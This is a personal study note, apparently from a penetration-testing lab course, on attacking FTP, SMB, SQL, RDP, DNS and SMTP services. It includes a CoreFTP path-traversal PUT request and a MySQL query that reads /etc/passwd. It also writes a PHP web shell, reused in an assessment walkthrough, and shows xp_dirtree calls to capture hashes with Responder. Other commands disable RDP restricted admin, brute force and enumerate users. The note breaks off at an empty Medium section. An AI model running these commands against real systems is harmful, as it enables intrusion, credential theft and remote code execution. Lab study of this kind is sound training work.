# Attacking Common Services

## FTP

Ways to attack are:

* Anonymous login
* Hydra Brute forcing

&#x20;[CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836) CoreFTP before build 727 does not properly authenticate put requests &#x20;

```shell-session
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

## SMB

Ways to attack are:

* Null authentication can test this with smbmap&#x20;
* Bruteforc with crackmapexec --local-auth flag is needed
* Psexec can be used to rum comands once we have cred
* PTH - Can use --sam flag and then PtH&#x20;
* Responder to captcher hashes

It is very important to use the --local-auth flag.

## SQL

```shell-session
select LOAD_FILE("/etc/passwd");
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

```cmd-session
xp_cmdshell 'whoami'
EXEC master..xp_dirtree '\\10.10.110.17\share\'
Responder hash stealing!
```

Ok so some stuff: Mysql I have a relatively good grasp on. MSSql not so much.

It is worth while to note that to connect with a responder hash you need to auth as the windows user not as the sql user like this;

```
sqsh -U 10.129.16.49\\mssqlsvc -P 'princess1' -S 10.129.16.49 -h
```

## RDP

We covered all this already in the password attacks section

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## DNS

```shell-session
fierce --domain zonetransfer.me
```

DNS spoofing is possible with ettercap

Zone transfer like this

```shell-session
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

```
echo "ns1.inlanefreight.htb" > ./resolvers.txt
./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
dig AXFR @<IP> hr.inlanefreight.htb
```

This challenge really sucked

## SMTP

```
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

Hydra to brute force pop3&#x20;

telnet to connect to mail service. Lookup smtp commands

## Assesment

### Easy

10.129.132.35

The first place to start enumrating users is smtp. Lets use the smtp-user-eum script. And we get fiona!&#x20;

Now let's try crack ftp as that is usually quite fast to bruteforce we get it! 987654321

Now we can log in to mysql and insert a shell pn the web server to gain RCE and we get the flag!

```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/xampp/htdocs/dashboard/shell.php';
```

### Medium
